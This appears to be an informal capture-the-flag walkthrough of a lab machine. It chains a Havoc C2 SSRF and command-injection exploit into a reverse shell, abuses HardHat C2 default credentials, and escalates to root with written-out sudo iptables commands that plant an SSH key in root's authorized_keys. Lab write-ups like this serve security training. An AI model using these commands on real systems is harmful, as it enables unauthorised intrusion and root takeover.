Started with a nmap scan
```
22 OpenSSH 9.2p1
443 nginx 1.22.1
5000 hardhat
7096 hardhat
8000 nginx 1.22.1
```
Going to the website on port `443` we get `404 error` going to run a gobuster on the host and see if there is anything we can find did not find anything on the server 
Now going to port `8000` there is a directory listing of some havoc c2 and there is two files `disable_tls.patch` and `havoc.yaotl` and doing some research there is a SSRF exploit `CVE-2024-41570` and we can chain this with a command injection vulnerability to get a reverse shell there is also a script someone made to automate this `https://github.com/temporaryJustice/Havoc-C2-RCE-2024/tree/main` we just need to modify the user and password and the payload and then running this command 
`python3 poc.py --target https://10.10.11.49/ -i 127.0.0.1 -p 40056`
and now we are the user `ilya` and the shell does not last long so when we get the callback we need to add are ssh key to the authorized keys file and now we have a stable shell on the box and we see a file called `hardhat.txt` in the home folder and it says that `Sergej` installed hardhat c2 for testing and when we look at open ports there is `5000,7096` running we need to forward those to are host and we can login with `sth_pentest:sth_pentest` I followed this blog on how to access the login `https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7` and now we can go to this link `https://127.0.0.1:7096/ImplantInteract` and add are ssh keys and now we are the user `sergej` and if we run `sudo -l` we can run and save iptables and we can exploit this to add are ssh pub key to the authorized_keys file 
```
sudo -u root /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nssh-ed25519 PUB-Key\n'  
sudo iptables-save -f /root/.ssh/authorized_keys
```
and now we can SSH into the root user 

